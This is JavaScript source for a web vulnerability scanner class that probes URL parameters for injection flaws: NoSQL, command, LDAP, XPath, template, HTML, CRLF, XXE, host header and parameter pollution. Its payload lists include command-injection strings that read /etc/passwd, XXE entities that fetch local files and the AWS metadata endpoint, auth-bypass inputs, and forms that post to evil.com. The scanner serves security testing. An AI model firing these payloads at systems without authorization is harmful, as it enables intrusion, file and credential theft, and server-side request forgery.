import { httpGet, httpPost, httpRequest } from '../../../utils/http-client.js';
import { URLParser } from '../../input/url-parser.js';
import { generateId, sleep } from '../../../utils/helpers.js';
import logger from '../../../utils/logger.js';

/**
 * Universal Injection Scanner
 * Covers: SQLi, NoSQLi, CMDi, LDAP, XPath, SSTI, HTML, CSS,
 * HTTP Header, CRLF, XXE, Host Header Injection
 */
export class InjectionScanner {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.safe = options.safe || false;
    this.results = [];
  }

  /**
   * Scan all injection types
   */
  async scanAll(url, options = {}) {
    logger.info(`[Injection] Full injection scan: ${url}`);
    const findings = [];

    const parsed = URLParser.parse(url);
    if (!parsed) return findings;

    const params = { ...parsed.params };

    // Discover additional params
    const discovered = await this._discoverParams(url);
    Object.assign(params, discovered);

    if (Object.keys(params).length === 0) {
      logger.debug('[Injection] No parameters found');
      return findings;
    }

    const scanners = [
      { name: 'NoSQL Injection', fn: () => this.scanNoSQLi(url, params) },
      { name: 'Command Injection', fn: () => this.scanCMDi(url, params) },
      { name: 'LDAP Injection', fn: () => this.scanLDAPi(url, params) },
      { name: 'XPath Injection', fn: () => this.scanXPathi(url, params) },
      { name: 'SSTI', fn: () => this.scanSSTI(url, params) },
      { name: 'HTML Injection', fn: () => this.scanHTMLi(url, params) },
      { name: 'CRLF Injection', fn: () => this.scanCRLF(url, params) },
      { name: 'XXE', fn: () => this.scanXXE(url, params) },
      { name: 'Host Header Injection', fn: () => this.scanHostHeader(url) },
      { name: 'HTTP Parameter Pollution', fn: () => this.scanHPP(url, params) },
    ];

    for (const scanner of scanners) {
      try {
        logger.info(`  [${scanner.name}] Scanning...`);
        const results = await scanner.fn();
        findings.push(...results);
        if (results.length > 0) {
          logger.vuln('high', `  [${scanner.name}] Found ${results.length} issues`);
        }
      } catch (error) {
        logger.debug(`  [${scanner.name}] Error: ${error.message}`);
      }
    }

    this.results = findings;
    return findings;
  }

  /**
   * NoSQL Injection Scanner
   */
  async scanNoSQLi(url, params) {
    const findings = [];
    const payloads = [
      // MongoDB operators
      { value: '{"$gt":""}', desc: 'MongoDB $gt operator' },
      { value: '{"$ne":""}', desc: 'MongoDB $ne operator' },
      { value: '{"$regex":".*"}', desc: 'MongoDB $regex' },
      { value: "' || '1'=='1", desc: 'NoSQL OR bypass' },
      { value: '{"$where":"1==1"}', desc: 'MongoDB $where' },
      { value: "admin'||''=='", desc: 'NoSQL string bypass' },
      { value: '[$ne]=1', desc: 'Array operator injection' },
      { value: '{"username":{"$gt":""},"password":{"$gt":""}}', desc: 'Auth bypass' },
    ];

    for (const [param, originalValue] of Object.entries(params)) {
      for (const payload of payloads) {
        try {
          const baseUrl = url.split('?')[0];
          const testParams = { ...params, [param]: payload.value };
          const testUrl = URLParser.buildUrl(baseUrl, testParams);

          const [normalResp, injectedResp] = await Promise.all([
            httpGet(url, { timeout: this.timeout }),
            httpGet(testUrl, { timeout: this.timeout }),
          ]);

          const normalBody = typeof normalResp.data === 'string' ? normalResp.data : '';
          const injectedBody = typeof injectedResp.data === 'string' ? injectedResp.data : '';

          // Check for different response indicating injection
          if (injectedResp.status === 200 && normalBody.length !== injectedBody.length &&
              Math.abs(normalBody.length - injectedBody.length) > 50) {
            findings.push({
              id: generateId('NOSQLI'),
              type: 'nosql-injection',
              severity: 'critical',
              url, parameter: param,
              payload: payload.value,
              evidence: `Response difference: normal(${normalBody.length}) vs injected(${injectedBody.length})`,
              description: payload.desc,
              timestamp: new Date().toISOString(),
            });
            break;
          }
        } catch { /* skip */ }
      }
    }
    return findings;
  }

  /**
   * Command Injection Scanner
   */
  async scanCMDi(url, params) {
    const findings = [];
    const payloads = [
      // Time-based detection (safe)
      { value: ';sleep 5', indicator: 'time', delay: 5, desc: 'Unix semicolon' },
      { value: '|sleep 5', indicator: 'time', delay: 5, desc: 'Unix pipe' },
      { value: '`sleep 5`', indicator: 'time', delay: 5, desc: 'Unix backtick' },
      { value: '$(sleep 5)', indicator: 'time', delay: 5, desc: 'Unix subshell' },
      { value: '& ping -c 5 127.0.0.1 &', indicator: 'time', delay: 5, desc: 'Unix background' },
      { value: '| timeout 5', indicator: 'time', delay: 5, desc: 'Windows timeout' },
      { value: '& timeout /t 5 &', indicator: 'time', delay: 5, desc: 'Windows timeout alt' },
      // Output-based detection
      { value: ';id', indicator: 'uid=', desc: 'Unix id command' },
      { value: '|id', indicator: 'uid=', desc: 'Unix pipe id' },
      { value: ';cat /etc/passwd', indicator: 'root:', desc: 'Unix passwd read' },
      { value: '|whoami', indicator: null, desc: 'Unix whoami' },
      { value: '& dir', indicator: 'Volume', desc: 'Windows dir' },
    ];

    for (const [param] of Object.entries(params)) {
      for (const payload of payloads) {
        try {
          const baseUrl = url.split('?')[0];
          const testParams = { ...params, [param]: `test${payload.value}` };
          const testUrl = URLParser.buildUrl(baseUrl, testParams);

          if (payload.indicator === 'time') {
            // Time-based detection
            const start = Date.now();
            await httpGet(testUrl, { timeout: (payload.delay + 10) * 1000 });
            const elapsed = Date.now() - start;

            if (elapsed >= payload.delay * 900) { // 90% of expected delay
              findings.push({
                id: generateId('CMDI'),
                type: 'command-injection',
                severity: 'critical',
                url, parameter: param,
                payload: payload.value,
                evidence: `Time delay detected: ${elapsed}ms (expected: ${payload.delay}s)`,
                description: payload.desc,
                timestamp: new Date().toISOString(),
              });
              break;
            }
          } else {
            // Output-based detection
            const response = await httpGet(testUrl, { timeout: this.timeout });
            const body = typeof response.data === 'string' ? response.data : '';

            if (payload.indicator && body.includes(payload.indicator)) {
              findings.push({
                id: generateId('CMDI'),
                type: 'command-injection',
                severity: 'critical',
                url, parameter: param,
                payload: payload.value,
                evidence: `Command output indicator "${payload.indicator}" found`,
                description: payload.desc,
                timestamp: new Date().toISOString(),
              });
              break;
            }
          }
        } catch { /* skip */ }
      }
    }
    return findings;
  }

  /**
   * LDAP Injection Scanner
   */
  async scanLDAPi(url, params) {
    const findings = [];
    const payloads = [
      { value: '*', desc: 'Wildcard' },
      { value: '*)(&', desc: 'Filter break' },
      { value: '*)(uid=*))(|(uid=*', desc: 'OR injection' },
      { value: '\\28', desc: 'Encoded parenthesis' },
      { value: 'admin)(&)', desc: 'Admin bypass' },
      { value: 'admin)(|(password=*)', desc: 'Password extraction' },
    ];

    for (const [param] of Object.entries(params)) {
      for (const payload of payloads) {
        try {
          const baseUrl = url.split('?')[0];
          const testParams = { ...params, [param]: payload.value };
          const testUrl = URLParser.buildUrl(baseUrl, testParams);

          const response = await httpGet(testUrl, { timeout: this.timeout });
          const body = typeof response.data === 'string' ? response.data : '';

          // LDAP error indicators
          if (body.match(/ldap_|invalid dn|bad search filter|ldap error/i)) {
            findings.push({
              id: generateId('LDAPI'),
              type: 'ldap-injection',
              severity: 'high',
              url, parameter: param,
              payload: payload.value,
              evidence: 'LDAP error message detected in response',
              description: payload.desc,
              timestamp: new Date().toISOString(),
            });
            break;
          }
        } catch { /* skip */ }
      }
    }
    return findings;
  }

  /**
   * XPath Injection Scanner
   */
  async scanXPathi(url, params) {
    const findings = [];
    const payloads = [
      { value: "' or '1'='1", desc: 'XPath OR bypass' },
      { value: "' or ''='", desc: 'Empty string bypass' },
      { value: "1' or '1'='1' or '1'='1", desc: 'Double OR' },
      { value: "'] | //user/*[contains(*,'", desc: 'Node extraction' },
      { value: "' and count(/*)>0 and '1'='1", desc: 'Count function' },
    ];

    for (const [param] of Object.entries(params)) {
      for (const payload of payloads) {
        try {
          const baseUrl = url.split('?')[0];
          const testParams = { ...params, [param]: payload.value };
          const testUrl = URLParser.buildUrl(baseUrl, testParams);

          const response = await httpGet(testUrl, { timeout: this.timeout });
          const body = typeof response.data === 'string' ? response.data : '';

          if (body.match(/xpath|xmldoc|SimpleXML|DOMDocument|lxml/i)) {
            findings.push({
              id: generateId('XPATHI'),
              type: 'xpath-injection',
              severity: 'high',
              url, parameter: param,
              payload: payload.value,
              evidence: 'XPath/XML error detected in response',
              description: payload.desc,
              timestamp: new Date().toISOString(),
            });
            break;
          }
        } catch { /* skip */ }
      }
    }
    return findings;
  }

  /**
   * Server-Side Template Injection (SSTI) Scanner
   */
  async scanSSTI(url, params) {
    const findings = [];
    const payloads = [
      // Detection payloads
      { value: '{{7*7}}', expected: '49', engine: 'Jinja2/Twig' },
      { value: '${7*7}', expected: '49', engine: 'Freemarker/Velocity' },
      { value: '#{7*7}', expected: '49', engine: 'Ruby ERB' },
      { value: '<%= 7*7 %>', expected: '49', engine: 'ERB/EJS' },
      { value: '{{7*\'7\'}}', expected: '7777777', engine: 'Jinja2' },
      { value: '*{7*7}', expected: '49', engine: 'Thymeleaf' },
      { value: '@(1+1)', expected: '2', engine: 'Razor' },
      { value: '#{7*7}', expected: '49', engine: 'Pebble' },
      { value: '#set($x=7*7)${x}', expected: '49', engine: 'Velocity' },
    ];

    for (const [param] of Object.entries(params)) {
      for (const payload of payloads) {
        try {
          const baseUrl = url.split('?')[0];
          const testParams = { ...params, [param]: payload.value };
          const testUrl = URLParser.buildUrl(baseUrl, testParams);

          const response = await httpGet(testUrl, { timeout: this.timeout });
          const body = typeof response.data === 'string' ? response.data : '';

          if (body.includes(payload.expected)) {
            findings.push({
              id: generateId('SSTI'),
              type: 'ssti',
              severity: 'critical',
              url, parameter: param,
              payload: payload.value,
              engine: payload.engine,
              evidence: `Template expression evaluated: ${payload.value} = ${payload.expected}`,
              timestamp: new Date().toISOString(),
            });
            break;
          }
        } catch { /* skip */ }
      }
    }
    return findings;
  }

  /**
   * HTML Injection Scanner
   */
  async scanHTMLi(url, params) {
    const findings = [];
    const payloads = [
      { value: '<h1>INJECTED</h1>', marker: '<h1>INJECTED</h1>' },
      { value: '<a href="https://evil.com">Click</a>', marker: 'href="https://evil.com"' },
      { value: '<form action="https://evil.com"><input name="data"></form>', marker: 'action="https://evil.com"' },
      { value: '<img src=x>', marker: '<img src=x>' },
    ];

    for (const [param] of Object.entries(params)) {
      for (const payload of payloads) {
        try {
          const baseUrl = url.split('?')[0];
          const testParams = { ...params, [param]: payload.value };
          const testUrl = URLParser.buildUrl(baseUrl, testParams);

          const response = await httpGet(testUrl, { timeout: this.timeout });
          const body = typeof response.data === 'string' ? response.data : '';

          if (body.includes(payload.marker)) {
            findings.push({
              id: generateId('HTMLI'),
              type: 'html-injection',
              severity: 'medium',
              url, parameter: param,
              payload: payload.value,
              evidence: 'HTML tags rendered in response without encoding',
              timestamp: new Date().toISOString(),
            });
            break;
          }
        } catch { /* skip */ }
      }
    }
    return findings;
  }

  /**
   * CRLF Injection Scanner
   */
  async scanCRLF(url, params) {
    const findings = [];
    const payloads = [
      { value: '%0d%0aInjected-Header:true', header: 'injected-header' },
      { value: '%0d%0a%0d%0a<html>CRLF</html>', header: null, body: '<html>CRLF</html>' },
      { value: '\\r\\nSet-Cookie:crlf=true', header: 'set-cookie' },
      { value: '%E5%98%8A%E5%98%8DInjected:true', header: 'injected' },
    ];

    for (const [param] of Object.entries(params)) {
      for (const payload of payloads) {
        try {
          const baseUrl = url.split('?')[0];
          const testParams = { ...params, [param]: `test${payload.value}` };
          const testUrl = URLParser.buildUrl(baseUrl, testParams);

          const response = await httpGet(testUrl, { timeout: this.timeout, followRedirects: false, maxRedirects: 0 });

          // Check if header was injected
          if (payload.header && response.headers[payload.header]) {
            findings.push({
              id: generateId('CRLF'),
              type: 'crlf-injection',
              severity: 'high',
              url, parameter: param,
              payload: payload.value,
              evidence: `Injected header "${payload.header}" found in response`,
              timestamp: new Date().toISOString(),
            });
            break;
          }

          // Check body injection
          if (payload.body) {
            const body = typeof response.data === 'string' ? response.data : '';
            if (body.includes(payload.body)) {
              findings.push({
                id: generateId('CRLF'),
                type: 'crlf-injection',
                severity: 'high',
                url, parameter: param,
                payload: payload.value,
                evidence: 'CRLF body injection successful',
                timestamp: new Date().toISOString(),
              });
              break;
            }
          }
        } catch { /* skip */ }
      }
    }
    return findings;
  }

  /**
   * XXE (XML External Entity) Scanner
   */
  async scanXXE(url, params) {
    const findings = [];

    // Test XML endpoints
    const xxePayloads = [
      {
        body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        indicator: 'root:',
        desc: 'File read (Linux)',
      },
      {
        body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        indicator: '[fonts]',
        desc: 'File read (Windows)',
      },
      {
        body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        indicator: 'ami-id',
        desc: 'SSRF via XXE (AWS metadata)',
      },
    ];

    // Try POST with XML content type
    for (const payload of xxePayloads) {
      try {
        const response = await httpPost(url, payload.body, {
          timeout: this.timeout,
          contentType: 'application/xml',
        });
        const body = typeof response.data === 'string' ? response.data : '';

        if (body.includes(payload.indicator)) {
          findings.push({
            id: generateId('XXE'),
            type: 'xxe',
            severity: 'critical',
            url,
            payload: payload.body.substring(0, 100) + '...',
            evidence: `XXE ${payload.desc}: indicator "${payload.indicator}" found`,
            timestamp: new Date().toISOString(),
          });
          break;
        }
      } catch { /* skip */ }
    }

    return findings;
  }

  /**
   * Host Header Injection Scanner
   */
  async scanHostHeader(url) {
    const findings = [];
    const testHeaders = [
      { header: 'Host', value: 'evil.com' },
      { header: 'X-Forwarded-Host', value: 'evil.com' },
      { header: 'X-Host', value: 'evil.com' },
      { header: 'X-Forwarded-Server', value: 'evil.com' },
    ];

    for (const test of testHeaders) {
      try {
        const response = await httpRequest('GET', url, {
          headers: { [test.header]: test.value },
          timeout: this.timeout,
          followRedirects: false,
          maxRedirects: 0,
        });

        const body = typeof response.data === 'string' ? response.data : '';
        const location = response.headers['location'] || '';

        // Check if evil.com appears in response or redirect
        if (body.includes('evil.com') || location.includes('evil.com')) {
          findings.push({
            id: generateId('HHI'),
            type: 'host-header-injection',
            severity: 'high',
            url,
            payload: `${test.header}: ${test.value}`,
            evidence: `Host header value reflected in response/redirect`,
            timestamp: new Date().toISOString(),
          });
          break;
        }
      } catch { /* skip */ }
    }

    return findings;
  }

  /**
   * HTTP Parameter Pollution Scanner
   */
  async scanHPP(url, params) {
    const findings = [];

    for (const [param, value] of Object.entries(params)) {
      try {
        // Send same parameter twice with different values
        const testUrl = `${url.split('?')[0]}?${param}=${value}&${param}=injected`;
        const response = await httpGet(testUrl, { timeout: this.timeout });
        const body = typeof response.data === 'string' ? response.data : '';

        // Check if 'injected' value is used (server-side HPP)
        if (body.includes('injected') && !body.includes(value)) {
          findings.push({
            id: generateId('HPP'),
            type: 'http-parameter-pollution',
            severity: 'medium',
            url, parameter: param,
            payload: `${param}=${value}&${param}=injected`,
            evidence: 'Server uses last/first occurrence of duplicate parameter',
            timestamp: new Date().toISOString(),
          });
        }
      } catch { /* skip */ }
    }

    return findings;
  }

  /**
   * Discover parameters from page
   */
  async _discoverParams(url) {
    const params = {};
    try {
      const response = await httpGet(url, { timeout: this.timeout });
      const html = typeof response.data === 'string' ? response.data : '';

      const inputs = html.matchAll(/<input[^>]*name=["']([^"']+)["'][^>]*/gi);
      for (const match of inputs) params[match[1]] = 'test';

      const selects = html.matchAll(/<select[^>]*name=["']([^"']+)["'][^>]*/gi);
      for (const match of selects) params[match[1]] = '1';

      const textareas = html.matchAll(/<textarea[^>]*name=["']([^"']+)["'][^>]*/gi);
      for (const match of textareas) params[match[1]] = 'test';
    } catch { /* skip */ }
    return params;
  }
}

export default InjectionScanner;
